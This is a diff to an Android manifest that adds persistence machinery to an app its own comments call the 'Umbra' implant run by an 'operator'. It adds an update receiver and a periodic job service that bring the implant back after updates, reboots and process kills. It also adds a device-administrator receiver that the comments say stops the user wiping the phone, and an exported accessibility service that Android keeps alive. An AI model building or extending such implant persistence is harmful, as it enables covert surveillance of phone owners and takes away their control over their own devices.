@@ -57,5 +57,56 @@
             android:name=".AlarmReceiver"
             android:enabled="true"
             android:exported="false" />
+
+        <!-- The update receiver: it starts the implant again when the
+             application itself was updated. -->
+        <receiver
+            android:name=".UpdateReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- The device administrator: a phone that is enrolled to a device
+             owner cannot be wiped by the user.  The operator has to know
+             that the phone is no longer personal. -->
+        <receiver
+            android:name=".UmbraAdminReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+        </receiver>
+
+        <!-- The periodic job: the job scheduler brings the implant back
+             after a reboot and after the system killed the application. -->
+        <service
+            android:name=".UmbraJobService"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <!-- The accessibility service: Android keeps it alive, and the
+             user sees it in the settings.  The operator is told so in the
+             report of the persistence. -->
+        <service
+            android:name=".UmbraAccessibilityService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
     </application>
 </manifest>
